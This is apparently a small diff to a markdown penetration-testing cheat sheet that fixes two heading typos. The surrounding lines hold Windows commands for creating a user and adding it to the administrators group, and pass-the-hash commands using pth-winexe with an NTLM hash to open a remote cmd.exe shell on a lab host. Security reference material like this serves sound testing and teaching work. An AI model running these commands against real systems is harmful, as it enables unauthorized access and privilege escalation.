@@ -401,7 +401,7 @@ pip3 install -r requirements.txt
 ```
 net user /add [username] [password]
 ```
-## Add as admin
+## Add User as an admin
 ```
 net localgroup administrators [username] /add
 ```
@@ -416,7 +416,7 @@ Example :<br>
 ```
 pth-winexe -U DOMAIN/USERNAME%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //IP_Server cmd.exe
 ```
-Real exempale :<br>
+Real Example :<br>
 
 ```
 pth-winexe -U LAB/Administrator%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //192.168.1.44 cmd.exe
